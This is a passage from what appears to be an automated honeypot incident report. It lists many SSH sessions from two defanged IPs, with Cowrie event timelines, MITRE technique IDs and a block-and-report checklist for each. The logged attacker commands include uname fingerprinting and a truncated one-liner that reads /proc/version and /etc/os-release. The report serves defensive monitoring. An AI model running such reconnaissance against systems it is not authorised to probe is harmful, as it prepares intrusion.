| `2026-09-24 16:34:13` | `cowrie.client.version` |
| `2026-09-24 16:34:16` | `cowrie.client.kex` |
| `2026-09-24 16:34:19` | `cowrie.login.success` |
| `2026-09-24 16:34:24` | `cowrie.session.params` |
| `2026-09-24 16:34:24` | `cowrie.command.input` |
| `2026-09-24 16:34:26` | `cowrie.log.closed` |
| `2026-09-24 16:34:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3f1fd5818e8

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:34 |
| **Last Seen** | 2026-09-24 16:34 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:34:17` | `cowrie.session.connect` |
| `2026-09-24 16:34:17` | `cowrie.client.version` |
| `2026-09-24 16:34:17` | `cowrie.client.kex` |
| `2026-09-24 16:34:20` | `cowrie.login.success` |
| `2026-09-24 16:34:23` | `cowrie.session.params` |
| `2026-09-24 16:34:23` | `cowrie.command.input` |
| `2026-09-24 16:34:24` | `cowrie.log.closed` |
| `2026-09-24 16:34:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a73f28c17f25

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:34 |
| **Last Seen** | 2026-09-24 16:34 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:34:17` | `cowrie.session.connect` |
| `2026-09-24 16:34:17` | `cowrie.client.version` |
| `2026-09-24 16:34:19` | `cowrie.client.kex` |
| `2026-09-24 16:34:22` | `cowrie.login.success` |
| `2026-09-24 16:34:26` | `cowrie.session.params` |
| `2026-09-24 16:34:26` | `cowrie.command.input` |
| `2026-09-24 16:34:28` | `cowrie.log.closed` |
| `2026-09-24 16:34:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d08bba4df670

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:34 |
| **Last Seen** | 2026-09-24 16:34 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:34:17` | `cowrie.session.connect` |
| `2026-09-24 16:34:17` | `cowrie.client.version` |
| `2026-09-24 16:34:19` | `cowrie.client.kex` |
| `2026-09-24 16:34:22` | `cowrie.login.success` |
| `2026-09-24 16:34:25` | `cowrie.session.params` |
| `2026-09-24 16:34:25` | `cowrie.command.input` |
| `2026-09-24 16:34:26` | `cowrie.log.closed` |
| `2026-09-24 16:34:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01de676f414f

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:34 |
| **Last Seen** | 2026-09-24 16:34 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:34:17` | `cowrie.session.connect` |
| `2026-09-24 16:34:17` | `cowrie.client.version` |
| `2026-09-24 16:34:19` | `cowrie.client.kex` |
| `2026-09-24 16:34:22` | `cowrie.login.success` |
| `2026-09-24 16:34:26` | `cowrie.session.params` |
| `2026-09-24 16:34:26` | `cowrie.command.input` |
| `2026-09-24 16:34:27` | `cowrie.log.closed` |
| `2026-09-24 16:34:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4781bb33dd5

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:34 |
| **Last Seen** | 2026-09-24 16:34 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:34:19` | `cowrie.session.connect` |
| `2026-09-24 16:34:19` | `cowrie.client.version` |
| `2026-09-24 16:34:19` | `cowrie.client.kex` |
| `2026-09-24 16:34:24` | `cowrie.login.success` |
| `2026-09-24 16:34:28` | `cowrie.session.params` |
| `2026-09-24 16:34:28` | `cowrie.command.input` |
| `2026-09-24 16:34:29` | `cowrie.log.closed` |
| `2026-09-24 16:34:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-638d871e7849

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:34 |
| **Last Seen** | 2026-09-24 16:34 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:34:19` | `cowrie.session.connect` |
| `2026-09-24 16:34:19` | `cowrie.client.version` |
| `2026-09-24 16:34:19` | `cowrie.client.kex` |
| `2026-09-24 16:34:23` | `cowrie.login.success` |
| `2026-09-24 16:34:27` | `cowrie.session.params` |
| `2026-09-24 16:34:27` | `cowrie.command.input` |
| `2026-09-24 16:34:29` | `cowrie.log.closed` |
| `2026-09-24 16:34:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-799af1486382

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:34 |
| **Last Seen** | 2026-09-24 16:34 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:34:19` | `cowrie.session.connect` |
| `2026-09-24 16:34:19` | `cowrie.client.version` |
| `2026-09-24 16:34:19` | `cowrie.client.kex` |
| `2026-09-24 16:34:24` | `cowrie.login.success` |
| `2026-09-24 16:34:28` | `cowrie.session.params` |
| `2026-09-24 16:34:28` | `cowrie.command.input` |
| `2026-09-24 16:34:29` | `cowrie.log.closed` |
| `2026-09-24 16:34:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1048b5b982c2

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:34 |
| **Last Seen** | 2026-09-24 16:34 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:34:19` | `cowrie.session.connect` |
| `2026-09-24 16:34:19` | `cowrie.client.version` |
| `2026-09-24 16:34:21` | `cowrie.client.kex` |
| `2026-09-24 16:34:29` | `cowrie.login.success` |
| `2026-09-24 16:34:32` | `cowrie.session.params` |
| `2026-09-24 16:34:32` | `cowrie.command.input` |
| `2026-09-24 16:34:33` | `cowrie.log.closed` |
| `2026-09-24 16:34:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15221e587b71

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:34 |
| **Last Seen** | 2026-09-24 16:34 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:34:22` | `cowrie.session.connect` |
| `2026-09-24 16:34:22` | `cowrie.client.version` |
| `2026-09-24 16:34:24` | `cowrie.client.kex` |
| `2026-09-24 16:34:29` | `cowrie.login.success` |
| `2026-09-24 16:34:33` | `cowrie.session.params` |
| `2026-09-24 16:34:33` | `cowrie.command.input` |
| `2026-09-24 16:34:35` | `cowrie.log.closed` |
| `2026-09-24 16:34:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4395774b5c8f

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:34 |
| **Last Seen** | 2026-09-24 16:34 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:34:22` | `cowrie.session.connect` |
| `2026-09-24 16:34:22` | `cowrie.client.version` |
| `2026-09-24 16:34:24` | `cowrie.client.kex` |
| `2026-09-24 16:34:29` | `cowrie.login.success` |
| `2026-09-24 16:34:30` | `cowrie.session.params` |
| `2026-09-24 16:34:30` | `cowrie.command.input` |
| `2026-09-24 16:34:32` | `cowrie.log.closed` |
| `2026-09-24 16:34:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd5304a816c0

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:34 |
| **Last Seen** | 2026-09-24 16:34 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:34:22` | `cowrie.session.connect` |
| `2026-09-24 16:34:22` | `cowrie.client.version` |
| `2026-09-24 16:34:24` | `cowrie.client.kex` |
| `2026-09-24 16:34:29` | `cowrie.login.success` |
| `2026-09-24 16:34:30` | `cowrie.session.params` |
| `2026-09-24 16:34:30` | `cowrie.command.input` |
| `2026-09-24 16:34:32` | `cowrie.log.closed` |
| `2026-09-24 16:34:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f865887eaef1

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:34 |
| **Last Seen** | 2026-09-24 16:34 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:34:22` | `cowrie.session.connect` |
| `2026-09-24 16:34:22` | `cowrie.client.version` |
| `2026-09-24 16:34:24` | `cowrie.client.kex` |
| `2026-09-24 16:34:29` | `cowrie.login.success` |
| `2026-09-24 16:34:31` | `cowrie.session.params` |
| `2026-09-24 16:34:31` | `cowrie.command.input` |
| `2026-09-24 16:34:32` | `cowrie.log.closed` |
| `2026-09-24 16:34:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a17f79412c25

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:34 |
| **Last Seen** | 2026-09-24 16:34 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:34:24` | `cowrie.session.connect` |
| `2026-09-24 16:34:24` | `cowrie.client.version` |
| `2026-09-24 16:34:26` | `cowrie.client.kex` |
| `2026-09-24 16:34:32` | `cowrie.login.success` |
| `2026-09-24 16:34:35` | `cowrie.session.params` |
| `2026-09-24 16:34:35` | `cowrie.command.input` |
| `2026-09-24 16:34:37` | `cowrie.log.closed` |
| `2026-09-24 16:34:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbd79a225877

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:34 |
| **Last Seen** | 2026-09-24 16:34 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:34:24` | `cowrie.session.connect` |
| `2026-09-24 16:34:24` | `cowrie.client.version` |
| `2026-09-24 16:34:26` | `cowrie.client.kex` |
| `2026-09-24 16:34:30` | `cowrie.login.success` |
| `2026-09-24 16:34:33` | `cowrie.session.params` |
| `2026-09-24 16:34:33` | `cowrie.command.input` |
| `2026-09-24 16:34:34` | `cowrie.log.closed` |
| `2026-09-24 16:34:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55f5a72845f1

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:34 |
| **Last Seen** | 2026-09-24 16:34 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:34:26` | `cowrie.session.connect` |
| `2026-09-24 16:34:26` | `cowrie.client.version` |
| `2026-09-24 16:34:29` | `cowrie.client.kex` |
| `2026-09-24 16:34:32` | `cowrie.login.success` |
| `2026-09-24 16:34:36` | `cowrie.session.params` |
| `2026-09-24 16:34:36` | `cowrie.command.input` |
| `2026-09-24 16:34:37` | `cowrie.log.closed` |
| `2026-09-24 16:34:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5487b51204c1

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:34 |
| **Last Seen** | 2026-09-24 16:34 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:34:26` | `cowrie.session.connect` |
| `2026-09-24 16:34:26` | `cowrie.client.version` |
| `2026-09-24 16:34:28` | `cowrie.client.kex` |
| `2026-09-24 16:34:32` | `cowrie.login.success` |
| `2026-09-24 16:34:34` | `cowrie.session.params` |
| `2026-09-24 16:34:34` | `cowrie.command.input` |
| `2026-09-24 16:34:35` | `cowrie.log.closed` |
| `2026-09-24 16:34:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f83273d59583

| Field | Detail |
|---|---|
| **Source IP** | `185.112.33[.]84` |
| **First Seen** | 2026-09-24 16:34 |
| **Last Seen** | 2026-09-24 16:34 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:34:26` | `cowrie.session.connect` |
| `2026-09-24 16:34:26` | `cowrie.client.version` |
| `2026-09-24 16:34:29` | `cowrie.client.kex` |
| `2026-09-24 16:34:32` | `cowrie.login.success` |
| `2026-09-24 16:34:35` | `cowrie.session.params` |
| `2026-09-24 16:34:35` | `cowrie.command.input` |
| `2026-09-24 16:34:36` | `cowrie.log.closed` |
| `2026-09-24 16:34:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.33[.]84` to AbuseIPDB if not already reported
- [ ] Block `185.112.33[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb44022f477c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-24 16:58 |
| **Last Seen** | 2026-09-24 16:58 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 16:58:02` | `cowrie.session.connect` |
| `2026-09-24 16:58:02` | `cowrie.client.version` |
| `2026-09-24 16:58:02` | `cowrie.client.kex` |
| `2026-09-24 16:58:05` | `cowrie.login.success` |
| `2026-09-24 16:58:07` | `cowrie.session.params` |
| `2026-09-24 16:58:07` | `cowrie.command.input` |
| `2026-09-24 16:58:07` | `cowrie.command.input` |
| `2026-09-24 16:58:07` | `cowrie.command.input` |
| `2026-09-24 16:58:07` | `cowrie.command.input` |
| `2026-09-24 16:58:07` | `cowrie.command.input` |
| `2026-09-24 16:58:07` | `cowrie.command.success` |
| `2026-09-24 16:58:07` | `cowrie.command.input` |
| `2026-09-24 16:58:07` | `cowrie.command.input` |
| `2026-09-24 16:58:07` | `cowrie.command.input` |
| `2026-09-24 16:58:07` | `cowrie.command.input` |
| `2026-09-24 16:58:08` | `cowrie.log.closed` |
| `2026-09-24 16:58:10` | `cowrie.session.params` |
| `2026-09-24 16:58:10` | `cowrie.command.input` |
| `2026-09-24 16:58:10` | `cowrie.log.closed` |
| `2026-09-24 16:58:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-889041aa6288

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-24 17:00 |
| **Last Seen** | 2026-09-24 17:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 17:00:20` | `cowrie.session.connect` |
| `2026-09-24 17:00:20` | `cowrie.client.version` |
| `2026-09-24 17:00:20` | `cowrie.client.kex` |
| `2026-09-24 17:00:21` | `cowrie.login.success` |
| `2026-09-24 17:00:22` | `cowrie.session.params` |
| `2026-09-24 17:00:22` | `cowrie.command.input` |
| `2026-09-24 17:00:22` | `cowrie.command.input` |
| `2026-09-24 17:00:22` | `cowrie.command.input` |
| `2026-09-24 17:00:22` | `cowrie.command.input` |
| `2026-09-24 17:00:22` | `cowrie.command.input` |
| `2026-09-24 17:00:22` | `cowrie.command.success` |
| `2026-09-24 17:00:22` | `cowrie.command.input` |
| `2026-09-24 17:00:22` | `cowrie.command.input` |
| `2026-09-24 17:00:22` | `cowrie.command.input` |
| `2026-09-24 17:00:22` | `cowrie.command.input` |
| `2026-09-24 17:00:22` | `cowrie.log.closed` |
| `2026-09-24 17:00:23` | `cowrie.session.params` |
| `2026-09-24 17:00:23` | `cowrie.command.input` |
| `2026-09-24 17:00:23` | `cowrie.log.closed` |
| `2026-09-24 17:00:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44224862b637

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-24 17:02 |
| **Last Seen** | 2026-09-24 17:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 17:02:36` | `cowrie.session.connect` |
| `2026-09-24 17:02:36` | `cowrie.client.version` |
| `2026-09-24 17:02:36` | `cowrie.client.kex` |
| `2026-09-24 17:02:37` | `cowrie.login.success` |
| `2026-09-24 17:02:38` | `cowrie.session.params` |
| `2026-09-24 17:02:38` | `cowrie.command.input` |
| `2026-09-24 17:02:38` | `cowrie.command.input` |
| `2026-09-24 17:02:38` | `cowrie.command.input` |
| `2026-09-24 17:02:38` | `cowrie.command.input` |
| `2026-09-24 17:02:38` | `cowrie.command.input` |
| `2026-09-24 17:02:38` | `cowrie.command.success` |
| `2026-09-24 17:02:38` | `cowrie.command.input` |
| `2026-09-24 17:02:38` | `cowrie.command.input` |
| `2026-09-24 17:02:38` | `cowrie.command.input` |
| `2026-09-24 17:02:38` | `cowrie.command.input` |
| `2026-09-24 17:02:39` | `cowrie.log.closed` |
| `2026-09-24 17:02:40` | `cowrie.session.params` |
| `2026-09-24 17:02:40` | `cowrie.command.input` |
| `2026-09-24 17:02:40` | `cowrie.log.closed` |
| `2026-09-24 17:02:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cde54dea8431

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-24 17:04 |
| **Last Seen** | 2026-09-24 17:04 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 17:04:46` | `cowrie.session.connect` |
| `2026-09-24 17:04:46` | `cowrie.client.version` |
| `2026-09-24 17:04:46` | `cowrie.client.kex` |
| `2026-09-24 17:04:47` | `cowrie.login.success` |
| `2026-09-24 17:04:48` | `cowrie.session.params` |
